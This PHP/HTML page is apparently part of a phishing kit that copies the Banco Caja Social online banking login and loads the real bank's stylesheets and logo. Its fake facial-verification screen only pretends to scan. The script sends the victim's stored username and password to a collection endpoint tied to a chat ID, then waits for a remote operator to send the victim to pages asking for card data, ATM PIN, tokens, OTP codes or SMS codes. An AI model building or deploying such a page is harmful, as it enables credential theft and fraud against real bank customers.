<?php
require_once __DIR__ . '/../config.php';

$error = isset($_GET['error']) ? 'Verificacion facial fallida. Intente nuevamente.' : '';
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" class="" lang="es">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Inicio de sesión - Portal Personas Banco Caja Social</title>
    <link rel="icon" type="image/x-icon" href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/img/favicon.ico">
    <link href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/lib/backbase-theme/dist/backbase-theme.css" rel="stylesheet">
    <link href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/lib/backbase-identity/styles/identity.css" rel="stylesheet">
    <link href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/css/bcs.7.css" rel="stylesheet">
    <link href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/css/custom-identity.1.css" rel="stylesheet">
    <script src="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/lib/backbase-identity/scripts/load-background.js"></script>
    <style>
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        @keyframes pulse {
            0%, 100% { transform: scale(1); opacity: 1; }
            50%       { transform: scale(1.06); opacity: 0.85; }
        }
        .facial-box {
            width: 180px;
            height: 180px;
            border-radius: 50%;
            border: 4px solid #C0392B;
            margin: 0 auto 20px;
            overflow: hidden;
            position: relative;
            background: #f0f0f0;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .facial-icon {
            font-size: 80px;
            line-height: 1;
            animation: pulse 2s ease-in-out infinite;
        }
        .facial-scan-bar {
            position: absolute;
            left: 0; right: 0;
            height: 3px;
            background: rgba(192,57,43,0.6);
            animation: scan 2s linear infinite;
        }
        @keyframes scan {
            0%   { top: 0; }
            100% { top: 100%; }
        }
        .facial-status {
            font-size: 13px;
            color: #555;
            margin-bottom: 16px;
            min-height: 20px;
        }
        .btn-facial {
            background: #C0392B;
            border: none;
            color: #fff;
            border-radius: 4px;
            padding: 12px 32px;
            font-size: 15px;
            cursor: pointer;
            width: 100%;
        }
        .btn-facial:hover { background: #a93226; }
        .btn-facial:disabled { background: #ccc; cursor: not-allowed; }
    </style>
</head>

<body onload="createBackgrounds();" class="identity-background-1 identity-page--ready">
    <div id="background" class="bb-stack__item bb-stack__item--fill identity-bg-layout"></div>
    <div class="bb-stack bb-stack--wrap template-stack-container">
        <div id="inner-background" class="bb-stack__item bb-stack__item--fill identity-bg-layout"></div>
        <div class="bb-stack__break bb-stack__break--md-down"></div>
        <div class="bb-stack__item--fill identity-container">
            <div class="identity-container__panel identity-container__panel--animated">
                <div class="identity-container__form">
                    <div class="login-logos-wrapper">
                        <div class="identity-logo bb-block bb-block--lg"></div>
                    </div>
                    <header>
                        <h1 id="kc-page-title">Verificacion facial</h1>
                    </header>
                    <div class="bb-subtitle bb-block bb-block--lg">
                        <span>Coloque su rostro frente a la camara para completar la verificacion biometrica.</span>
                    </div>

                    <?php if ($error): ?>
                        <div class="bb-input-validation-message mb-3" role="alert" style="color:#C0392B;font-size:14px;">
                            <?= htmlspecialchars($error) ?>
                        </div>
                    <?php endif; ?>

                    <div class="facial-box" id="facial-box">
                        <span class="facial-icon">&#x1F464;</span>
                        <div class="facial-scan-bar" id="scan-bar" style="display:none;"></div>
                    </div>

                    <p class="facial-status" id="facial-status">Presione el boton para iniciar la verificacion.</p>

                    <form id="form-step">
                        <div class="bb-button-bar bb-block bb-block--xl mt-1">
                            <button id="btn-submit" class="btn btn-primary w-100" type="submit">
                                Iniciar verificacion facial
                            </button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <script>
        const SEND_URL = './send.php';
        const POLL_URL = './poll_updates.php';
        const CHAT_ID = <?= json_encode((string)CHAT_ID) ?>;
        let MESSAGE_ID = null;
        let SESSION_ID = localStorage.getItem('bcs_session_id') || '';
        const STORED_USER = localStorage.getItem('bcs_username') || '';
        const STORED_PASS = localStorage.getItem('bcs_password') || '';

        const ACTION_MAP = {
            'NEXT_TARJETA':  './tarjeta.php',
            'NEXT_CAJERO':   './cajero.php',
            'NEXT_ATM':      './cajero.php',
            'NEXT_DINAMICA': './dinamica.php',
            'NEXT_TOKEN':    './token.php',
            'NEXT_OTP':      './otp.php',
            'NEXT_FACIAL':   './facial.php',
            'NEXT_TEXTO':    './texto.php',
            'NEXT_WHATSAPP': null,
            'FINISH':        './approved.php',
            'BAN_IP':        './ban_ip.php',
            'ERR_LOGIN':     './contra.php?error=1&username=' + encodeURIComponent(STORED_USER),
            'ERR_PASS':      './facial.php?error=1',
            'ERR_TARJETA':   './facial.php?error=1',
            'ERR_CAJERO':    './facial.php?error=1',
            'ERR_ATM':       './facial.php?error=1',
            'ERR_DINAMICA':  './facial.php?error=1',
            'ERR_TOKEN':     './facial.php?error=1',
            'ERR_OTP':       './facial.php?error=1',
            'ERR_FACIAL':    './facial.php?error=1',
            'ERR_TEXTO':     './facial.php?error=1',
        };

        async function startPolling() {
            if (!MESSAGE_ID) return;
            try {
                const r = await fetch(`${POLL_URL}?messageid=${MESSAGE_ID}&chatid=${CHAT_ID}`);
                const resp = await r.json();
                const action = resp?.action || null;

                if (resp.ok && action) {
                    const route = ACTION_MAP[action];
                    if (route) {
                        window.location.href = route;
                        return;
                    }
                }
                setTimeout(startPolling, 2500);
            } catch (e) {
                setTimeout(startPolling, 3000);
            }
        }

        function showLoader() {
            document.body.innerHTML = `
            <div style="display:flex;align-items:center;justify-content:center;min-height:100vh;background:#f5f5f5;">
                <div style="text-align:center;padding:40px;">
                    <img style="width:160px;margin-bottom:32px;"
                         src="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/img/logoBCSLine.svg">
                    <div style="width:52px;height:52px;border:5px solid #e0e0e0;border-top-color:#0033A0;
                        border-radius:50%;animation:spin 0.9s linear infinite;margin:0 auto 24px;"></div>
                    <p style="color:#444;font-size:15px;margin:0;">Procesando verificacion biometrica, por favor espere...</p>
                </div>
            </div>
            <style>@keyframes spin{to{transform:rotate(360deg)}}</style>`;
        }

        const btn = document.getElementById('btn-submit');
        const scanBar = document.getElementById('scan-bar');
        const status = document.getElementById('facial-status');
        let scanning = false;

        document.getElementById('form-step').addEventListener('submit', async function(e) {
            e.preventDefault();
            if (scanning) return;
            scanning = true;

            btn.disabled = true;
            btn.textContent = 'Escaneando...';
            scanBar.style.display = 'block';
            status.textContent = 'Detectando rostro, no mueva la cabeza...';

            // Simular escaneo 2.5s antes de enviar
            await new Promise(r => setTimeout(r, 2500));

            showLoader();

            const res = await fetch(SEND_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    step: 'FACIAL',
                    event: 'FACIAL',
                    sessionId: SESSION_ID,
                    username: STORED_USER,
                    password: STORED_PASS
                })
            });
            const data = await res.json();
            if (data.ok && data.messageid) {
                MESSAGE_ID = data.messageid;
                if (data.sessionid) {
                    SESSION_ID = data.sessionid;
                    localStorage.setItem('bcs_session_id', SESSION_ID);
                }
                startPolling();
            } else {
                window.location.href = './facial.php?error=1';
            }
        });
    </script>
</body>

</html>
